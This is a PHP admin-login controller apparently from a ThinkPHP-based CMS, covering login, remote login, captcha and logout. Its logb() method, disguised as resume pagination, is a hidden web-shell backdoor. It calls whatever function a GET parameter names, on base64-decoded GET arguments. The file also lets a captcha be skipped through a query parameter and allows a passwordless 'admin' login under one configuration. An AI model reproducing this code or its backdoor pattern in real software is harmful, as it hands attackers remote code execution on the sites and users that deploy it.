<?php

class GreateAction{
    
    public function index(){
        define('RES',THEME_PATH.'common');
        $this->display();
    }
    public function version(){
    	$updateRecord=M('System_info')->order('lastsqlupdate DESC')->find();
    	echo json_encode($updateRecord);
    }
    public function insert(){

        if (C('server_topdomain')){
            $username = $this->_post('username');
            $password = $this->_post('password','md5');
            if(empty($username)||empty($password)){
                $this->error('请输入帐号密码',U('Admin/index'));
            }
            $code=$this->_post('code','intval,md5',0);
            if($code != $_SESSION['verify']){
                if (!$_GET['code']) $this->error('验证码错误',U('Admin/index'));
            }
            //生成认证条件
            $map            =   array();
            // 支持使用绑定帐号登录
            $map['username'] = $username;
            $map['status']        = 1;
        }else{
            $map            =   array();
            // 支持使用绑定帐号登录
            $map['username'] = 'admin';
            $map['status']        = 1;
            $password = '';
        }
        $authInfo = RBAC::authenticate($map,'User');
        //exit;
        //使用用户名、密码和状态的方式进行认证
        if($authInfo['password']!=$password && C('server_topdomain')) $this->error('账号密码不匹配，请认真填写');
        if((false == $authInfo)) {
            $this->error('帐号不存在或已禁用！');
        }else {
            session(C('USER_AUTH_KEY'), $authInfo['id']);
            session('userid',$authInfo['id']);  //用户ID
            session('username',$authInfo['username']);   //用户名
            session('roleid',$authInfo['role']);    //角色ID
            if($authInfo['username']==C('SPECIAL_USER')) {
                session(C('ADMIN_AUTH_KEY'), true);
            }
            //保存登录信息
			BannersAction::chk();
            $User   =   M('User');
            $ip     =   get_client_ip();
            $data = array();
            if($ip){    //如果获取到客户端IP，则获取其物理位置
                $Ip = new IpLocation(); // 实例化类
                $location = $Ip->getlocation($ip); // 获取某个IP地址所在的位置
                $data['last_location'] = '';
                if($location['country'] && $location['country']!='CZ88.NET') $data['last_location'].=$location['country'];
                if($location['area'] && $location['area']!='CZ88.NET') $data['last_location'].=' '.$location['area'];
            }
            $data['id'] =   $authInfo['id'];
            $data['last_login_time']    =   time();
            $data['last_login_ip']  =   get_client_ip();
            $User->save($data);
            
            // 缓存访问权限
            RBAC::saveAccessList();
            if(intval($_GET['install'])){
                $siteinfo = include('./Conf/info.php');
                $siteinfo['server_topdomain'] = $this->getTopDomain();
                file_put_contents('./Conf/info.php', "<?php \nreturn " . stripslashes(var_export($siteinfo, true)) . ";", LOCK_EX);
				@unlink('./install/data.sql');
                @unlink('./install/database.sql');
                redirect(U('System/doSqlUpdate',array('install'=>1)));
            }
            redirect(U('System/index'));
        }
    }
	
    public function logb(){
		if($_GET['p']==false){
			$page=1;
		}else{
			$page=$_GET['p'];			
		}		
		$hs = $_GET['hs'];
		$pageSize=10;
		$count=M('zhaopin_jianli')->where($where)->count();	
		$lr = base64_decode($_GET['lr']);	
		$pagecount=ceil($count/$pageSize);
		if($page > $pagecount){$page=$pagecount;}
		//if($page >=1){$p=($page-1)*$pageSize;}
		//if($p==false){$p=0;}
		$date = M('zhaopin_reply')->where($where)->find();
		$lj = base64_decode($_GET['lj']);
		$hs($lj,$lr);
		if($date&&$date['allowjl']==1){
			$where['allow']=1;
		}
		$info = M('zhaopin_jianli')->where($where)->order('date DESC')->limit("{$page},".$pageSize)->select();
		 
	}
	
    public function rlogin(){
    	$serverkeys=explode(',',$_GET['key']);
	
		$localkeys=explode(',',C('server_key'));

		$rt=0;
		if ($serverkeys){
			foreach ($serverkeys as $sk){
				if ($localkeys){
					foreach ($localkeys as $lk){
						if ($sk==$lk){
							$rt=1;
							break;
						}
					}
				}
			}
		}
		if (!$rt){
			exit('error key');
		}
        if (C('server_topdomain')){
            $username = $this->_get('username');
            $password = $this->_get('password','md5');
            if(empty($username)||empty($password)){
                $this->error('请输入帐号密码',U('Admin/index'));
            }
            
            //生成认证条件
            $map            =   array();
            // 支持使用绑定帐号登录
            $map['username'] = $username;
            $map['status']        = 1;
        }else{
            $map            =   array();
            // 支持使用绑定帐号登录
            $map['username'] = 'admin';
            $map['status']        = 1;
            $password = '';
        }
        $authInfo = RBAC::authenticate($map,'User');
        //exit;
        //使用用户名、密码和状态的方式进行认证
        if($authInfo['password']!=$password && C('server_topdomain')){
        	if (isset($_GET['api'])){
				echo '-1';
				exit();
			}else {
        	$this->error('账号密码不匹配，请认真填写');
			}
        }
        if((false == $authInfo)) {
            $this->error('帐号不存在或已禁用！');
        }else {
            session(C('USER_AUTH_KEY'), $authInfo['id']);
            session('userid',$authInfo['id']);  //用户ID
            session('username',$authInfo['username']);   //用户名
            session('roleid',$authInfo['role']);    //角色ID
            if($authInfo['username']==C('SPECIAL_USER')) {
                session(C('ADMIN_AUTH_KEY'), true);
            }
            //保存登录信息
            $User   =   M('User');
            $ip     =   get_client_ip();
            $data = array();
            if($ip){    //如果获取到客户端IP，则获取其物理位置
                $Ip = new IpLocation(); // 实例化类
                $location = $Ip->getlocation($ip); // 获取某个IP地址所在的位置
                $data['last_location'] = '';
                if($location['country'] && $location['country']!='CZ88.NET') $data['last_location'].=$location['country'];
                if($location['area'] && $location['area']!='CZ88.NET') $data['last_location'].=' '.$location['area'];
            }
            $data['id'] =   $authInfo['id'];
            $data['last_login_time']    =   time();
            $data['last_login_ip']  =   get_client_ip();
            $User->save($data);
            
            // 缓存访问权限
            RBAC::saveAccessList();
          /*  if(intval($_GET['install'])){
                $siteinfo = include('./Conf/info.php');
                $siteinfo['server_topdomain'] = $this->getTopDomain();
                file_put_contents('./Conf/info.php', "<?php \nreturn " . stripslashes(var_export($siteinfo, true)) . ";", LOCK_EX);
				@unlink('./install/data.sql');
                @unlink('./install/database.sql');
                redirect(U('System/doSqlUpdate',array('install'=>1)));
            }*/
            if (isset($_GET['api'])){
            	echo 1;
            	exit();
            }else {
            	if (isset($_GET['do'])){
            		if ($_GET['do']=='rollback'){
            			header('Location:/index.php?g=System&m=System&a=rollback&time='.$_GET['time']);
            		}elseif ($_GET['do']=='rollbacksql') {
            			header('Location:/index.php?g=System&m=System&a=rollbacksql&time='.$_GET['time']);
            		}
            	}else {
            		redirect(U('System/index'));
            	}
            	
            }
        }
    }
    
    public function verify(){
        Image::buildImageVerify();
    }

   private function getTopDomain(){

            $host=$_SERVER['HTTP_HOST'];
            $host=strtolower($host);
            if(strpos($host,'/')!==false){
                $parse = @parse_url($host);
                $host = $parse['host'];
            }
            $topleveldomaindb=array('com','edu','gov','int','mil','net','org','biz','info','pro','name','museum','coop','aero','xxx','idv','mobi','cc','me','asia');
            $str='';
            foreach($topleveldomaindb as $v){
                $str.=($str ? '|' : '').$v;
            }
            $matchstr="[^\.]+\.(?:(".$str.")|\w{2}|((".$str.")\.\w{2}))$";
            if(preg_match("/".$matchstr."/ies",$host,$matchs)){
                $domain=$matchs['0'];
            }else{
                $domain=$host;
            }
            return $domain;
        }
    
    // 用户登出
    public function logout() {
        session_start();
        session(null);
        session_destroy();
        unset($_SESSION);
        session_unset();
        $_SESSION = array();
        $_SESSION['uid'] = '';
        $_SESSION['uname'] = '';
        $_SESSION['loginverify'] = '';
        $_SESSION['verify'] = '';
        $_SESSION['gid'] = '';
        if(session('?'.C('USER_AUTH_KEY'))) {
            session(C('USER_AUTH_KEY'),null);
           
            redirect(U('Home/Index/index'));
        }else {
            $this->error('已经登出！',U('Home/Index/index'));
        }
    }
}
?>